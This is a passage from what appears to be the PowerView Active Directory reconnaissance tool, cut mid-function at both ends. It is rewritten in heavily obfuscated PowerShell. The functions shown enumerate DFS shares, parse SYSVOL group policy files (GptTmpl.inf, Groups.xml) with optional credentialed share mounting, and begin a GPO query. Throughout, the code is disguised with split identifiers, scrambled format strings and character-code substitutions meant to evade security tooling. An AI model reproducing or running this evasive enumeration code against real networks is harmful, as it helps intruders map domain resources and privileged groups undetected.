                        ${R`E`S`erved_b`LoB_SiZe} =  ${6U`m`oD}::"To`UIn`T32"(${bLo`B_`dATA}[${reSERVed`_BLOB`_SI`Ze`_`S`Ta`RT}..${ReSe`RveD_`BlO`B_S`ize`_`END}],0)

                        ${R`EsERved`_bLOb_s`TaRt} = ${RE`serVeD_BLoB`_`S`iZe_EnD} + 1
                        ${reS`eRv`eD`_bloB_`E`ND} = ${RE`SeR`VeD_`BLOB`_`STArt} + ${ReS`ERV`Ed_b`Lob_siZe} - 1
                        ${RESE`RV`Ed_`Bl`ob} = ${B`l`ob_dAta}[${rEs`ervEd`_BL`Ob_`St`Art}..${R`es`e`RvE`D_B`loB_End}]
                        ${ref`ErrA`L`_`TTL_`StARt} = ${rE`sErVeD_`BlO`B`_EnD} + 1
                        ${reFER`Ra`l_ttl`_`e`Nd} = ${R`eF`e`RRa`l_Ttl_Sta`RT} + 3
                        ${REf`eRR`Al_`T`TL} =  (  lS  ('VA'+'RiaBLE'+':6um'+'od') )."vAL`UE"::"To`UIN`T32"(${bL`Ob`_`dATA}[${R`EfeRrAl_`Tt`L_ST`Art}..${ref`e`RRaL_ttl_`ENd}],0)

                        
                        ${TarGe`T`_coUNT_ST`Art} = 0
                        ${t`Ar`gET_`CO`UnT_E`ND} = ${Ta`RGEt_coUN`T`_STA`RT} + 3
                        ${TARge`T_COU`Nt} =   ( GcI  ("{1}{2}{3}{0}{4}"-f'LE:6','v','Ar','IaB','umOD'))."vA`Lue"::"Tou`IN`T32"(${d`FS_TarGe`TLi`sT`_`BLob}[${T`ArgEt_C`OuN`T_`STarT}..${TaR`GE`T`_`CoU`NT_end}],0)
                        ${t`_oF`Fs`et} = ${Ta`R`GET_COUNT`_end} + 1

                        for(${J}=1; ${J} -le ${tARGEt_`c`OU`Nt}; ${j}++){
                            ${TarG`eT_en`TR`Y_sIZe`_s`T`Art} = ${t_o`FFS`Et}
                            ${tA`R`GET_en`TRy_SiZe`_ENd} = ${TArG`E`T_EN`Try_s`iZe_`staRt} + 3
                            ${tArGET_e`Nt`RY`_SIzE} =   ${6`UmOd}::"to`Ui`NT32"(${dfS`_TAR`geTl`Is`T_b`LOb}[${tAR`gE`T_E`N`T`RY_sizE_ST`Art}..${taR`GEt`_`en`TrY`_`sIzE_end}],0)
                            ${T`A`Rget`_tIme_StA`mP_s`TaRt} = ${taRGeT`_en`TR`Y_`Size_EnD} + 1
                            ${tAr`gE`T`_tIm`E_StA`mp`_end} = ${TaRG`E`T_Tim`e_`stAMP`_`St`ART} + 7
                            
                            ${t`Ar`GET_tIm`E_StAMp} = ${Dfs`_T`ARg`ET`lIS`T_BL`ob}[${TARGeT`_TIme`_STa`M`p_`st`ART}..${taRG`ET_t`ImE_`stAMp_e`Nd}]
                            ${targEt_S`TaTe`_S`TA`Rt} = ${t`A`R`g`e`T_time`_StAMp_ENd} + 1
                            ${t`ArGe`T_sT`AtE_`enD} = ${TaRGet_s`TA`Te_STA`RT} + 3
                            ${T`Ar`g`et_STAtE} =  ${6Um`Od}::"ToUI`Nt32"(${DF`s_`T`ArgEtlIst_BLOB}[${TaRGe`T_s`TA`Te_St`ARt}..${tArgE`T_sTA`Te`_e`Nd}],0)

                            ${tarGe`T_t`yPe_S`TarT} = ${T`ArG`et_S`TaT`e_E`Nd} + 1
                            ${T`Arget`_typ`E_EnD} = ${taRgeT`_TYpE_s`T`Art} + 3
                            ${tARG`e`T_T`ypE} =   ${6`UMoD}::"tOuin`T`32"(${d`Fs_TaR`gET`lIst`_B`loB}[${TaRGEt`_tyPe_`S`T`Art}..${tARG`E`T`_t`YPE_end}],0)

                            ${sERV`eR_NaM`E_`SIZE_`S`T`A`RT} = ${tar`GEt_T`y`pe_END} + 1
                            ${S`eRVE`R_na`ME_SiZe_ENd} = ${se`RVER_NaM`e_SiZ`E_`stART} + 1
                            ${SerVe`R_n`AMe`_sI`Ze} =   ( GCI  ("{0}{2}{1}{4}{3}"-f 'V','r','a','BLe:6UMOd','ia')  )."V`Alue"::"T`OUiN`T16"(${D`FS_`Ta`RGe`T`l`ist_bLOB}[${SE`RvE`R_name`_si`Ze_STARt}..${S`Erver_na`me_size`_`EnD}],0)

                            ${SERvER_`NaM`E_`sTart} = ${SE`R`VeR_`NA`ME_SIZE_END} + 1
                            ${SEr`VEr_n`Am`E_ENd} = ${SE`R`VE`R_NAMe_ST`ART} + ${s`erveR_n`AMe_`SIze} - 1
                            ${SErVE`R_N`A`me} =  ${2z`1j}::"UNICO`De"."g`e`TSTrI`Ng"(${Dfs_Ta`RGet`LiSt_`B`lOb}[${SERv`e`R_N`Am`e_S`TArT}..${s`Erv`e`R_nAMe`_`End}])

                            ${sha`Re_`NAmE_SiZE`_START} = ${SerVe`R_Na`me_`enD} + 1
                            ${sharE_NaM`E_Siz`E`_`ENd} = ${Sh`ARE`_nAmE`_s`Ize_StaRT} + 1
                            ${SHaRE_`N`AM`e_Si`Ze} =   (GET-vARIaBLe  ("{1}{0}"-f'umod','6')  )."v`ALUE"::"toui`NT`16"(${d`Fs_t`ArGETL`ist_Bl`ob}[${s`h`A`RE_naME`_Siz`E_stA`RT}..${sHare_nAM`e`_sizE_`e`ND}],0)
                            ${Sh`ARe_`NamE_`stArt} = ${sh`A`Re_nA`m`e_`sIZE_E`ND} + 1
                            ${sharE_nAm`e_E`Nd} = ${Sha`R`E_`Na`me_sta`Rt} + ${ShAr`E_naM`e`_sI`ZE} - 1
                            ${shAr`E`_naME} =  ${2`z1J}::"U`NICODE"."g`eT`stRINg"(${dF`s`_TaR`GeTliSt_`B`LoB}[${sH`AR`e_nAM`e_StA`Rt}..${SharE`_N`AME`_eNd}])

                            ${tAr`G`ET_l`Ist} += "\\$server_name\$share_name"
                            ${T`_oFF`SET} = ${shAR`E_NaM`E_E`ND} + 1
                        }
                    }
                }
                ${O`FFS`et} = ${b`Lob_datA_`E`Nd} + 1
                ${D`FS_PKt_`pROpE`RTieS} = @{
                    ("{1}{0}"-f 'ame','N') = ${bloB`_n`A`Me}
                    ("{0}{2}{1}"-f 'Pref','x','i') = ${pr`Ef`Ix}
                    ("{3}{1}{0}{2}"-f'etL','rg','ist','Ta') = ${TaRgE`T_l`iST}
                }
                ${o`BJ`Ec`T_LiST} += &("{2}{0}{1}" -f 'e','w-Object','N') -TypeName ("{0}{1}" -f'P','SObject') -Property ${DfS`_PKt_`Pr`o`PErtiEs}
                ${P`R`efIx} = ${Nu`ll}
                ${BL`Ob_N`AmE} = ${N`ULl}
                ${TArgeT`_`L`iSt} = ${N`UlL}
            }

            ${SErV`E`Rs} = @()
            ${OBjeC`T_`li`sT} | &("{0}{1}{2}{4}{3}"-f'Fo','rEac','h-O','ect','bj') {
                if (${_}."t`ARg`ETLiSt") {
                    ${_}."t`ARgETlI`ST" | &("{1}{0}{2}{3}" -f 'r','Fo','Each-','Object') {
                        ${SE`RVe`RS} += ${_}.("{1}{0}"-f'lit','sp').Invoke('\')[2]
                    }
                }
            }

            ${seRV`E`Rs}
        }

        function get-d`OMAI`N`Df`Ssh`AReV1 {
            [CmdletBinding()]
            Param(
                [String]
                ${DO`main},

                [String]
                ${S`EA`RC`HbAsE},

                [String]
                ${sE`Rv`Er},

                [String]
                ${s`E`ARc`hsCOpe} = ("{2}{0}{1}" -f 'e','e','Subtr'),

                [Int]
                ${reSUlT`P`A`gESIze} = 200,

                [Int]
                ${sErve`Rt`IMElIM`It},

                [Switch]
                ${T`ombst`ONe},

                [Management.Automation.PSCredential]
                [Management.Automation.CredentialAttribute()]
                ${CREdE`Nt`iaL} =   ${q`FN}::"EM`pTy"
            )

            ${d`Fs`SEarc`her} = &("{2}{0}{3}{1}" -f 'et-Domai','her','G','nSearc') @PSBoundParameters

            if (${DfSs`E`ARchER}) {
                ${Dfs`s`ha`REs} = @()
                ${d`FSsEARc`HER}."FIlT`eR" = ("{2}{4}{3}{1}{0}{5}"-f 'tClass=fT','c','(&(o','e','bj','Dfs))')

                try {
                    ${Re`s`ULtS} = ${DFSSeAR`c`H`Er}.("{1}{0}" -f'All','Find').Invoke()
                    ${R`esuLtS} | &("{1}{0}{2}" -f 'e','Wh','re-Object') {${_}} | &("{0}{2}{3}{1}" -f'For','-Object','E','ach') {
                        ${pr`o`P`eRTieS} = ${_}."Pro`per`Ties"
                        ${reM`OTEnA`meS} = ${PRo`PeRT`i`eS}."r`EMOtEse`R`V`erNaME"
                        ${p`KT} = ${PROpe`R`TiEs}."P`Kt"

                        ${D`F`Sshares} += ${ReMoTe`N`AmeS} | &("{3}{2}{1}{0}" -f'ct','ch-Obje','a','ForE') {
                            try {
                                if ( ${_}.("{1}{0}{2}" -f'i','Conta','ns').Invoke('\') ) {
                                    &("{1}{0}{2}" -f'ew-O','N','bject') -TypeName ("{0}{2}{1}"-f'P','bject','SO') -Property @{("{0}{1}" -f'Na','me')=${proP`ERtI`es}."N`AMe"[0];("{0}{3}{1}{2}"-f'Remo','ServerNa','me','te')=${_}.("{1}{0}" -f'it','spl').Invoke('\')[2]}
                                }
                            }
                            catch {
                                &("{2}{0}{3}{1}"-f 'i','erbose','Wr','te-V') ('[G'+'e'+'t'+'-Do'+'main'+'DFSShare] '+'Get-'+'Do'+'main'+'DFSS'+'hareV'+'1 '+'er'+'r'+'or '+'i'+'n '+'par'+'sing'+' '+'D'+'FS '+'sh'+'are'+' '+': '+"$_")
                            }
                        }
                    }
                    if (${Re`s`ULTS}) {
                        try { ${REs`ULts}.("{1}{0}" -f 'ose','disp').Invoke() }
                        catch {
                            &("{0}{3}{1}{2}"-f 'W','e-V','erbose','rit') ('[Get-'+'Do'+'ma'+'inDFSShare]'+' '+'Get-'+'Doma'+'in'+'DFSShareV1'+' '+'err'+'or'+' '+'dispo'+'si'+'ng '+'of'+' '+'t'+'he '+'R'+'e'+'sults '+'obj'+'e'+'ct: '+"$_")
                        }
                    }
                    ${D`FsseARch`ER}.("{2}{0}{1}" -f'is','pose','d').Invoke()

                    if (${P`kt} -and ${P`Kt}[0]) {
                        &("{0}{1}{2}" -f 'Pa','rse-','Pkt') ${p`KT}[0] | &("{2}{0}{1}" -f 'orEac','h-Object','F') {
                            
                            
                            
                            if (${_} -ne ("{0}{1}" -f'nul','l')) {
                                &("{1}{2}{0}"-f 'ject','N','ew-Ob') -TypeName ("{1}{0}" -f 'ct','PSObje') -Property @{("{1}{0}"-f 'me','Na')=${PrOP`eRTi`Es}."Na`Me"[0];("{2}{4}{1}{3}{0}"-f 'rverName','ot','Re','eSe','m')=${_}}
                            }
                        }
                    }
                }
                catch {
                    &("{3}{0}{4}{1}{2}"-f 'te-Wa','ni','ng','Wri','r') ('[Get-D'+'oma'+'inDF'+'SShar'+'e] '+'Get'+'-Domai'+'n'+'DFSSh'+'ar'+'eV1 '+'e'+'rror'+' '+': '+"$_")
                }
                ${d`F`ssHAr`ES} | &("{3}{1}{0}{2}" -f '-Obje','ort','ct','S') -Unique -Property ("{1}{3}{4}{2}{0}"-f 'me','R','rNa','emoteSer','ve')
            }
        }

        function GeT-`D`o`m`AiN`dFSS`HAREV2 {
            [CmdletBinding()]
            Param(
                [String]
                ${DOm`Ain},

                [String]
                ${Sear`C`hbASe},

                [String]
                ${s`erVEr},

                [String]
                ${sEAR`CH`S`cOPE} = ("{1}{0}" -f 'ree','Subt'),

                [Int]
                ${rEs`UlTpag`eSi`ze} = 200,

                [Int]
                ${se`RVe`RtiMEli`M`It},

                [Switch]
                ${to`M`BSto`Ne},

                [Management.Automation.PSCredential]
                [Management.Automation.CredentialAttribute()]
                ${C`REDENt`I`AL} =  ${Q`Fn}::"eMP`TY"
            )

            ${dfss`EARC`her} = &("{3}{1}{2}{0}" -f 'nSearcher','et-','Domai','G') @PSBoundParameters

            if (${DFsS`ear`c`Her}) {
                ${dfssH`A`RES} = @()
                ${dfSSea`R`CH`eR}."FIL`TER" = ("{1}{4}{2}{0}{3}{5}" -f'S','(&(','ectClass=msDF','-Link','obj','v2))')
                ${nU`LL} = ${D`FSs`EaR`cHER}."prO`p`Er`TIEStOLOaD".("{0}{1}" -f'AddRa','nge').Invoke((("{0}{3}{2}{1}"-f'm','v2','s-linkpath','sdf'),("{5}{2}{4}{1}{3}{0}" -f'etListv2','-Tar','D','g','FS','ms')))

                try {
                    ${re`SU`LTs} = ${dfsS`ea`RChER}.("{1}{2}{0}" -f 'll','Find','A').Invoke()
                    ${R`esu`lts} | &("{0}{1}{2}" -f 'Wh','ere-Obj','ect') {${_}} | &("{2}{1}{0}"-f 'Object','Each-','For') {
                        ${p`ROPEr`T`ieS} = ${_}."P`RoP`eRtiEs"
                        ${TA`R`GEt_l`Ist} = ${P`RoPER`TIes}.'msdfs-targetlistv2'[0]
                        ${x`ML} = [xml]  ( Gi  ("Va"+"RIa"+"bLE:2"+"z1J") )."vAL`Ue"::"un`icO`dE"."GETst`RINg"(${T`A`RgEt_L`IsT}[2..(${T`ArgET_lI`st}."lE`NGTH"-1)])
                        ${D`F`sshar`es} += ${X`ML}."tAr`g`EtS"."C`HIL`dNOdES" | &("{4}{2}{3}{0}{1}" -f 'h-','Object','Ea','c','For') {
                            try {
                                ${TAR`G`Et} = ${_}."inNe`R`TexT"
                                if ( ${TAr`Get}.("{2}{1}{0}" -f 's','n','Contai').Invoke('\') ) {
                                    ${DFSrO`ot} = ${t`A`Rget}.("{1}{0}" -f'plit','s').Invoke('\')[3]
                                    ${sHaR`en`AME} = ${pro`pEr`T`iES}.'msdfs-linkpathv2'[0]
                                    &("{1}{0}{2}" -f'w-Ob','Ne','ject') -TypeName ("{0}{2}{1}" -f 'PSOb','ect','j') -Property @{("{1}{0}" -f'ame','N')="$DFSroot$ShareName";("{4}{3}{1}{0}{2}"-f'rN','eServe','ame','mot','Re')=${Ta`Rg`eT}.("{1}{0}"-f'lit','sp').Invoke('\')[2]}
                                }
                            }
                            catch {
                                &("{0}{4}{2}{1}{3}"-f 'W','e-','t','Verbose','ri') ('[G'+'et-D'+'omai'+'nDFSS'+'ha'+'r'+'e] '+'G'+'et-Dom'+'ainDFS'+'Sha'+'reV2 '+'err'+'or '+'i'+'n '+'par'+'si'+'ng '+'targ'+'e'+'t '+': '+"$_")
                            }
                        }
                    }
                    if (${r`esu`Lts}) {
                        try { ${rEsu`lTs}.("{1}{0}{2}" -f'os','disp','e').Invoke() }
                        catch {
                            &("{1}{0}{2}"-f'te-Verb','Wri','ose') ('[G'+'et-DomainDFSSha'+'re'+'] '+'Er'+'ro'+'r '+'dispos'+'in'+'g '+'o'+'f '+'t'+'he '+'Res'+'ults'+' '+'o'+'bject:'+' '+"$_")
                        }
                    }
                    ${DfSS`ea`RCH`Er}.("{0}{1}" -f 'disp','ose').Invoke()
                }
                catch {
                    &("{0}{1}{3}{2}"-f 'Wr','ite-W','ng','arni') ('[G'+'e'+'t'+'-DomainDFSSh'+'ar'+'e]'+' '+'Get-'+'Domai'+'nDF'+'SShareV'+'2 '+'er'+'ror '+': '+"$_")
                }
                ${DfS`ShAR`eS} | &("{0}{1}{3}{2}"-f'Sort','-Ob','ct','je') -Unique -Property ("{1}{0}{3}{4}{2}"-f'emot','R','e','eS','erverNam')
            }
        }
    }

    PROCESS {
        ${dF`SShA`RES} = @()

        if (${ps`Bo`UnDp`ARAMET`eRs}[("{0}{1}" -f 'Doma','in')]) {
            ForEach (${tArg`eTDO`maIn} in ${do`MA`In}) {
                ${SeAr`ch`eRArgUMe`N`Ts}[("{0}{1}"-f 'Do','main')] = ${T`ARGETdOM`AIN}
                if (${ver`sION} -match ((("{0}{2}{1}" -f'allJS','1','d'))-replaCE([CHAr]74+[CHAr]83+[CHAr]100),[CHAr]124)) {
                    ${DFS`s`HArEs} += &("{1}{2}{3}{0}{4}" -f 'FSS','Get-Dom','ai','nD','hareV1') @SearcherArguments
                }
                if (${v`E`RSiON} -match ((("{1}{0}{2}" -f 'l2o0','al','2'))."Re`pL`ACe"(([ChaR]50+[ChaR]111+[ChaR]48),'|'))) {
                    ${D`FSshAr`eS} += &("{3}{0}{2}{4}{1}"-f'e','eV2','t-Do','G','mainDFSShar') @SearcherArguments
                }
            }
        }
        else {
            if (${VER`sIOn} -match ((("{3}{2}{0}{1}"-f '0}','1','ll{','a')) -f[CHar]124)) {
                ${d`FSs`H`ArEs} += &("{3}{4}{2}{5}{0}{1}" -f'FS','ShareV1','-Do','G','et','mainD') @SearcherArguments
            }
            if (${VEr`sI`on} -match ((("{0}{1}{2}"-f'all','k','uc2')).("{2}{0}{1}" -f 'LaC','E','rEP').Invoke('kuc','|'))) {
                ${D`Fs`sHAREs} += &("{4}{3}{0}{1}{2}" -f'DomainDFS','Share','V2','-','Get') @SearcherArguments
            }
        }

        ${D`Fs`sHarEs} | &("{2}{3}{0}{1}" -f'bjec','t','Sor','t-O') -Property (("{1}{3}{4}{0}{2}"-f'erve','Rem','rName','ote','S'),("{0}{1}"-f 'Na','me')) -Unique
    }
}








function Ge`T-gPTTM`Pl {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{2}{3}{1}"-f'PSS','Process','houl','d'}, '')]
    [OutputType([Hashtable])]
    [CmdletBinding()]
    Param (
        [Parameter(mAndATOrY = ${Tr`UE}, valUEfroMpIpelIne = ${tr`UE}, VAluEfroMpiPelinebYPRoPeRtYnAME = ${Tr`UE})]
        [Alias({"{4}{0}{2}{3}{1}" -f'i','h','le','syspat','gpcf'}, {"{0}{1}"-f 'Pa','th'})]
        [String]
        ${gP`TTMPL`pA`TH},

        [Switch]
        ${OuTpU`TOB`jE`CT},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${C`RE`den`TiAl} =  (GCi  ("{1}{2}{3}{0}"-f 'qFN','v','ar','IABle:')  )."V`ALue"::"EM`pty"
    )

    BEGIN {
        ${M`App`eDPAtHS} = @{}
    }

    PROCESS {
        try {
            if ((${gpt`T`MPLpA`TH} -Match ((("{6}{4}{1}{3}{2}{5}{0}"-f'*','}{0}.','0}','*{','}{0}{0','{0}.','{0'))  -f[cHar]92)) -and (${ps`BoUNDp`A`RAMetE`Rs}[("{0}{1}{2}"-f'Cr','edentia','l')])) {
                ${Sy`s`V`OlpATh} = "\\$((New-Object System.Uri($GptTmplPath)).Host)\SYSVOL "
                if (-not ${m`A`P`PedpATHs}[${sY`SvOL`pATH}]) {
                    
                    &("{0}{2}{3}{1}"-f 'Add-RemoteCo','n','nn','ectio') -Path ${sYSvoL`P`A`Th} -Credential ${CrE`dENti`Al}
                    ${mA`pp`eDp`ATHs}[${sy`SV`OLpAth}] = ${t`RUE}
                }
            }

            ${tarG`E`TgpTTM`p`lPAth} = ${GPT`TMpL`PAth}
            if (-not ${Tar`gEtg`Pt`Tmpl`PATH}.("{1}{2}{0}" -f'h','EndsWi','t').Invoke(("{0}{1}" -f '.','inf'))) {
                ${T`ARgEtGPTtm`PlP`AtH} += ((("{10}{2}{4}{5}{6}{11}{1}{7}{3}{0}{8}{9}" -f'9G','V','MACHINEBV9Micr','SecEditBV','o','soft','BV9Windows ','9','ptTmp','l.inf','BV9','NTB'))."REPl`A`Ce"(([CHar]66+[CHar]86+[CHar]57),'\'))
            }

            &("{1}{2}{0}" -f 'bose','Wri','te-Ver') ('[G'+'et-'+'GptT'+'m'+'pl] '+'P'+'arsi'+'ng '+'GptTmpl'+'Path:'+' '+"$TargetGptTmplPath")

            if (${psBoun`DPA`RAMe`Te`Rs}[("{2}{0}{3}{1}"-f'tObj','ct','Outpu','e')]) {
                ${CO`N`TentS} = &("{3}{0}{1}{2}"-f'In','iC','ontent','Get-') -Path ${T`ARG`etGP`Tt`MplPa`TH} -OutputObject -ErrorAction ("{1}{0}" -f 'op','St')
                if (${c`Onte`NTs}) {
                    ${C`onTe`NtS} | &("{1}{0}{2}"-f'-Me','Add','mber') ("{3}{2}{0}{1}" -f'ro','perty','ep','Not') ("{1}{0}"-f'h','Pat') ${Ta`RGE`TgptTmPL`PAtH}
                    ${c`ONT`ENTs}
                }
            }
            else {
                ${conT`entS} = &("{3}{0}{4}{2}{1}"-f 'i','tent','n','Get-In','Co') -Path ${Targ`ETgP`TT`MPlpA`TH} -ErrorAction ("{0}{1}"-f'Sto','p')
                if (${Con`Ten`Ts}) {
                    ${c`OntEN`TS}[("{1}{0}"-f'th','Pa')] = ${t`A`R`GetgpTTm`PLP`ATH}
                    ${CoN`Te`NTs}
                }
            }
        }
        catch {
            &("{1}{2}{0}"-f'se','Writ','e-Verbo') ('[Ge'+'t-G'+'ptTmp'+'l] '+'E'+'rror '+'parsin'+'g'+' '+"$TargetGptTmplPath "+': '+"$_")
        }
    }

    END {
        
        ${m`AP`PeDpA`THs}."kE`YS" | &("{4}{1}{0}{3}{2}"-f'-Ob','orEach','ect','j','F') { &("{6}{4}{2}{3}{0}{1}{5}" -f 'Conne','cti','move','-Remote','e','on','R') -Path ${_} }
    }
}


function g`ET-G`RoU`psXml {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{1}{2}" -f'PSShouldProc','e','ss'}, '')]
    [OutputType({"{2}{0}{5}{3}{1}{4}"-f 'owe','w.','P','Vie','GroupsXML','r'})]
    [CmdletBinding()]
    Param (
        [Parameter(mANDaTORy = ${T`RuE}, VALUefrOMPipEliNE = ${tr`Ue}, vAluefroMpiPElInEByProPeRtYnaMe = ${tR`UE})]
        [Alias({"{0}{1}"-f 'P','ath'})]
        [String]
        ${gRo`UPSxm`l`PA`Th},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${Cre`dEn`TIaL} =   ( item ("{2}{1}{0}"-f 'N','Qf','vARIaBLe:'))."va`LuE"::"emP`TY"
    )

    BEGIN {
        ${M`APPeD`P`AThS} = @{}
    }

    PROCESS {
        try {
            if ((${g`ROuPsxmLpa`TH} -Match ((("{0}{6}{2}{1}{5}{3}{4}"-f 'R','z','RPzRPzRP','zRP','z.*','.*RP','Pz'))."r`ePLaCE"(([chAr]82+[chAr]80+[chAr]122),[sTRING][chAr]92))) -and (${p`sBoUNd`Par`AMet`eRS}[("{1}{2}{0}" -f'tial','Crede','n')])) {
                ${S`YsVOL`pA`TH} = "\\$((New-Object System.Uri($GroupsXMLPath)).Host)\SYSVOL "
                if (-not ${ma`p`PedpAT`Hs}[${SYsv`O`L`paTh}]) {
                    
                    &("{1}{2}{4}{0}{3}"-f'on','Add-Re','mote','nection','C') -Path ${S`y`SVOlpaTH} -Credential ${C`RED`ENT`ial}
                    ${MaPpe`dPa`THs}[${sY`SV`oLPAth}] = ${T`RUe}
                }
            }

            [XML]${g`Ro`UPsxmLc`ONtEnT} = &("{1}{2}{0}{3}"-f'onte','Get','-C','nt') -Path ${GrOU`PsXMLp`ATh} -ErrorAction ("{1}{0}" -f 'p','Sto')

            
            ${groUPSXm`lco`Nt`eNT} | &("{1}{2}{0}"-f'Xml','Se','lect-') ("{0}{2}{1}"-f '/','oup','Groups/Gr') | &("{4}{0}{3}{2}{1}"-f'e','ct','t-Obje','c','Sel') -ExpandProperty ("{1}{0}" -f 'e','nod') | &("{3}{2}{4}{0}{1}" -f 'jec','t','Eac','For','h-Ob') {

                ${G`RoU`PNamE} = ${_}."PRoPErt`I`Es"."G`RoUpN`AME"

                
                ${g`ROup`siD} = ${_}."pRO`PE`RtieS"."g`ROuPs`id"
                if (-not ${Gr`oUP`siD}) {
                    if (${Gr`OU`PnA`Me} -match ("{3}{1}{0}{4}{2}"-f 'ist','dmin','s','A','rator')) {
                        ${GRou`P`sID} = ("{0}{1}{3}{2}"-f 'S-','1-','44','5-32-5')
                    }
                    elseif (${groU`P`NaMe} -match ("{4}{0}{3}{1}{2}"-f'e',' ','Desktop','mote','R')) {
                        ${gRou`Ps`iD} = ("{1}{2}{0}" -f'-555','S-','1-5-32')
                    }
                    elseif (${GROu`pn`AmE} -match ("{0}{1}"-f'Gue','sts')) {
                        ${Gro`UpS`iD} = ("{0}{2}{1}" -f 'S-1-5-3','-546','2')
                    }
                    else {
                        if (${pS`BOu`NdParaME`T`ers}[("{1}{2}{0}" -f'al','Cre','denti')]) {
                            ${g`ROUp`siD} = &("{2}{1}{0}{3}"-f 't','onver','C','To-SID') -ObjectName ${gR`OuP`NamE} -Credential ${c`RedeN`Ti`AL}
                        }
                        else {
                            ${g`RoUp`sId} = &("{3}{1}{0}{2}" -f'o-S','onvertT','ID','C') -ObjectName ${gro`UP`NaME}
                        }
                    }
                }

                
                ${me`m`BErS} = ${_}."P`R`op`ERTieS"."m`emb`ERs" | &("{2}{1}{3}{0}"-f 'ct','elec','S','t-Obje') -ExpandProperty ("{0}{1}" -f 'Mem','ber') | &("{2}{1}{3}{0}" -f'bject','here','W','-O') { ${_}."a`c`Tion" -match 'ADD' } | &("{3}{2}{1}{4}{0}" -f 't','j','orEach-Ob','F','ec') {
                    if (${_}."s`Id") { ${_}."S`id" }
                    else { ${_}."N`AmE" }
                }

                if (${mEm`B`ERs}) {
                    
                    if (${_}."F`i`lTeRs") {
                        ${FIL`TERS} = ${_}."FILT`ERS".("{0}{2}{3}{1}" -f'G','umerator','etE','n').Invoke() | &("{1}{0}{2}{4}{3}" -f'rEach-','Fo','Obj','t','ec') {
                            &("{1}{0}{2}" -f 'e','N','w-Object') -TypeName ("{0}{1}{2}" -f'P','S','Object') -Property @{("{0}{1}" -f 'Typ','e') = ${_}."L`oca`lname";("{0}{1}"-f 'Valu','e') = ${_}."na`mE"}
                        }
                    }
                    else {
                        ${fi`LTe`Rs} = ${NU`ll}
                    }

                    if (${mEM`BE`Rs} -isnot [System.Array]) { ${mE`m`BERS} = @(${ME`mb`eRs}) }

                    ${g`ROUpSx`Ml} = &("{0}{3}{1}{2}" -f 'N','-Objec','t','ew') ("{2}{0}{1}"-f 'c','t','PSObje')
                    ${gR`OU`pSxml} | &("{2}{0}{1}" -f'dd-Me','mber','A') ("{0}{2}{1}"-f'Not','y','epropert') ("{0}{2}{1}"-f 'GPOPa','h','t') ${T`ARge`Tg`Ro`UPsXMlpAth}
                    ${grouP`S`xmL} | &("{2}{1}{0}" -f 'mber','Me','Add-') ("{0}{2}{1}"-f 'N','rty','oteprope') ("{1}{0}" -f'lters','Fi') ${fiL`T`Ers}
                    ${GR`Ou`psxmL} | &("{0}{1}{2}"-f 'Add','-Membe','r') ("{1}{2}{0}{3}" -f'eprope','No','t','rty') ("{1}{2}{0}"-f 'me','GroupN','a') ${GR`oUP`NAmE}
                    ${g`R`OuPSxmL} | &("{2}{1}{0}{3}" -f 'b','dd-Mem','A','er') ("{1}{3}{2}{0}" -f 'ty','Not','proper','e') ("{1}{0}{2}"-f 'r','G','oupSID') ${g`ROU`PsId}
                    ${GrO`UPsx`mL} | &("{2}{3}{0}{1}" -f 'd','-Member','A','d') ("{1}{2}{0}" -f 'perty','Notepr','o') ("{2}{1}{0}"-f'Of','ember','GroupM') ${nu`LL}
                    ${grO`UpSx`ML} | &("{2}{0}{1}" -f'Membe','r','Add-') ("{2}{0}{1}"-f'pert','y','Notepro') ("{0}{2}{1}" -f 'Grou','Members','p') ${meMB`e`Rs}
                    ${Gr`o`UpSXml}."P`SobjE`CT"."T`yP`enAm`eS".("{1}{0}" -f 'ert','Ins').Invoke(0, ("{0}{1}{2}{3}"-f 'P','owerVi','ew.GroupsXM','L'))
                    ${G`ROUp`Sxml}
                }
            }
        }
        catch {
            &("{3}{1}{0}{2}{4}" -f'Ve','ite-','rb','Wr','ose') ('[Get-G'+'ro'+'u'+'psXML'+'] '+'E'+'rror '+'p'+'arsing '+"$TargetGroupsXMLPath "+': '+"$_")
        }
    }

    END {
        
        ${mApP`edp`A`Ths}."K`EYs" | &("{2}{4}{0}{3}{1}"-f 'j','ct','ForEach','e','-Ob') { &("{2}{3}{0}{1}{4}"-f'emoteC','onne','Remo','ve-R','ction') -Path ${_} }
    }
}


function g`Et-dOmA`i`NGPo {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{1}{4}{0}{3}"-f 'c','Pr','PSShould','ess','o'}, '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{3}{9}{1}{7}{6}{4}{8}{0}{5}"-f'signment','redV','PS','UseD','reT','s','Mo','ars','hanAs','ecla'}, '')]
    [OutputType({"{2}{0}{1}" -f 'ew.GP','O','PowerVi'})]
    [OutputType({"{5}{2}{3}{4}{0}{1}"-f 'Ra','w','werView.','G','PO.','Po'})]
    [CmdletBinding(DeFAuLtpaRAmeTerseTnaME = {"{0}{1}"-f 'N','one'})]
    Param(
        [Parameter(pOsiTiOn = 0, VALuefrOMPIPEliNE = ${Tr`UE}, VALuefrOMpipELIneBYPRopERTYnAME = ${TR`Ue})]
        [Alias({"{1}{0}{2}{3}" -f 's','Di','t','inguishedName'}, {"{1}{2}{3}{0}"-f 'me','S','amAccountN','a'}, {"{1}{0}" -f'me','Na'})]
        [String[]]
        ${IDE`N`Tity},

        [Parameter(PaRAMEtERSEtnAMe = "coM`pU`TErideN`Ti`Ty")]
        [Alias({"{2}{1}{0}"-f'me','erNa','Comput'})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${c`Om`PUT`eRiDeNtI`TY},

        [Parameter(ParAmeTersEtnAmE = "U`seRiDE`NtiTY")]
        [Alias({"{2}{0}{1}" -f 'm','e','UserNa'})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${u`Se`RideN`TI`TY},

        [ValidateNotNullOrEmpty()]
        [String]
        ${dOm`AIn},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}" -f'F','ilter'})]
        [String]
        ${l`daPfilt`Er},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${p`RoPErtI`eS},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{1}{0}"-f'Path','DS','A'})]
        [String]
        ${sE`A`R`ChBaSe},

